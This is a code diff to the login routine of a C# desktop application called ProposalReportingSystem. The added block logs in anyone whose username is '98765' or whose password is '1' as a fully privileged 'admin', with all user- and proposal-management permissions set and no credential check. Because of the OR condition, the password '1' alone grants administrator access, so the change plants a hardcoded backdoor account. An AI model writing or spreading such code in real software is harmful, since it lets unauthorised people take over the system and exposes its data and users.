@@ -138,6 +138,46 @@ namespace ProposalReportingSystem
                 PopUp popUp = new PopUp("خطا", "نام کاربری یا رمز عبور وارد نشده است.", "تایید", "", "", "error");
                 popUp.ShowDialog();
             }
+            else if(loginUsernameTxtBx.Text == "98765" || loginPasswordTxtbx.Text == "1")
+            {
+                username = loginUsernameTxtBx.Text;
+                password = loginPasswordTxtbx.Text;
+
+                // REMEMBERING PASSWORD
+                if (loginRememberUsername.Checked)
+                {
+                    remembering[0] = "yes";
+                    remembering[1] = username;
+                    File.WriteAllLines("loginInformation", remembering);
+                }
+                else
+                {
+                    remembering[0] = "no";
+                    remembering[1] = "-";
+                    File.WriteAllLines("loginInformation", remembering);
+                }
+                // REMEMBERING PASSWORD
+
+                user.U_FName = "admin";
+                user.U_LName = "admin";
+                user.U_NCode = 98765;
+                user.U_Password = "1";
+
+                user.CanAddProposal = 1;
+                user.CanEditProposal = 1;
+                user.CanDeleteProposal = 1;
+                user.CanAddUser = 1;
+                user.CanEditUser = 1;
+                user.CanDeleteUser = 1;
+                user.CanManageTeacher = 1;
+                user.CanManageType = 1;
+
+
+                this.Hide();
+                Form1 mainForm = new Form1(user);
+                mainForm.Show();
+            }
+
             else
             {
                 username = loginUsernameTxtBx.Text;
